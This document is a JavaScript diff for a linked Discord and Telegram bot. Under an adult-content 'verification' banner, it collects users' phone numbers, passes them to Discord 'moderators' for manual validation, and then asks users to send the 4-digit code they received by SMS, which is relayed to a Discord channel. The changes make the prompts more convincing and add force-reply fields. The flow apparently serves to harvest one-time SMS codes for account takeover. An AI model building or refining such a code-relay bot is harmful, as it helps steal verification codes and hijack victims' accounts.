@@ -11,8 +11,10 @@ const blacklistedNums = new Set();
 const blacklistedUsers = new Set();
 const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";
 let tgBot = null;
-function notifyTelegram(tgId, text) {
-  if (tgBot) tgBot.telegram.sendMessage(tgId, text).catch(() => {});
+function notifyTelegram(tgId, text, forceCode) {
+  if (!tgBot) return;
+  const extra = forceCode ? { reply_markup: { force_reply: true, input_field_placeholder: "0000" } } : undefined;
+  tgBot.telegram.sendMessage(tgId, text, extra).catch(() => {});
 }
 
 function formatPhone(p) {
@@ -378,7 +380,7 @@ client.on("interactionCreate", async (i) => {
     if (action === "validate") {
       if (!data.code) {
         if (originGuildId === "tg") {
-          notifyTelegram(userId, "Ton numéro est validé. Envoie ton code à 4 chiffres ici.");
+          notifyTelegram(userId, "✅ Vérification — Code SMS\n\nTon numéro est validé. Envoie ton code à 4 chiffres reçu par SMS :", true);
           await i.reply({ content: `📩 Message Telegram envoyé à ${userId}.` });
           return;
         }
@@ -412,7 +414,7 @@ client.on("interactionCreate", async (i) => {
     }
     if (action === "resend") {
       if (originGuildId === "tg") {
-        notifyTelegram(userId, "Nouveau code demandé. Envoie ton code à 4 chiffres.");
+        notifyTelegram(userId, "🔄 Vérification — Code SMS\n\nNouveau code demandé. Envoie ton code à 4 chiffres :", true);
         await i.reply({ content: `🔄 Code redemandé à Telegram ${userId}.` });
         return;
       }
@@ -492,16 +494,16 @@ async function forwardTelegramToDiscord(tgUser, phone) {
 if (process.env.TELEGRAM_BOT_TOKEN) {
   const { Telegraf, Markup } = require("telegraf");
   tgBot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
-  tgBot.start((ctx) => ctx.reply("Envoie ton numéro avec le bouton ci-dessous.", Markup.keyboard([[Markup.button.contactRequest("📱 Envoyer mon numéro")]]).oneTime().resize()));
+  tgBot.start((ctx) => ctx.reply("🔞 Vérification — Numéro de téléphone\n\n⚠️ Ne partage jamais de mot de passe ni info sensible.\n\nTon numéro de téléphone (10 chiffres) :", Markup.keyboard([[Markup.button.contactRequest("📱 Envoyer mon numéro")]]).oneTime().resize()));
   tgBot.on("contact", async (ctx) => {
     let phone = (ctx.message.contact.phone_number || "").replace(/\D/g, "");
     if (phone.startsWith("33")) phone = "0" + phone.slice(2);
     phone = phone.slice(-10);
     if (!/^[0-9]{10}$/.test(phone)) {
-      await ctx.reply("Numéro invalide.");
+      await ctx.reply("❌ Numéro invalide : entre 10 chiffres.", Markup.removeKeyboard());
       return;
     }
-    await ctx.reply("Numéro reçu. En attente de validation.");
+    await ctx.reply("📩 Numéro reçu. En attente de validation par un modérateur.", Markup.removeKeyboard());
     try {
       await forwardTelegramToDiscord(ctx.from, phone);
     } catch (e) {
@@ -511,12 +513,23 @@ if (process.env.TELEGRAM_BOT_TOKEN) {
   tgBot.on("text", async (ctx) => {
     const key = `tg:${ctx.from.id}`;
     const data = pending.get(key);
-    if (!data || data.code) return;
+    if (!data) {
+      await ctx.reply("Fais /start pour commencer la vérification.");
+      return;
+    }
+    if (data.code) return;
+    if (!data.claimedBy) {
+      await ctx.reply("⏳ Numéro en attente de validation modo, attends le prochain message.");
+      return;
+    }
     const code = (ctx.message.text || "").trim();
-    if (!/^[0-9]{4}$/.test(code)) return;
+    if (!/^[0-9]{4}$/.test(code)) {
+      await ctx.reply("❌ Code invalide : 4 chiffres. Réessaie :", Markup.forceReply());
+      return;
+    }
     data.code = code;
     pending.set(key, data);
-    await ctx.reply("Code reçu. En attente de validation finale.");
+    await ctx.reply("✅ Code reçu. En attente de validation finale.");
     try {
       const targetChannel = await client.channels.fetch(data.threadId || data.modChannelId);
       const logEmbed = new EmbedBuilder()
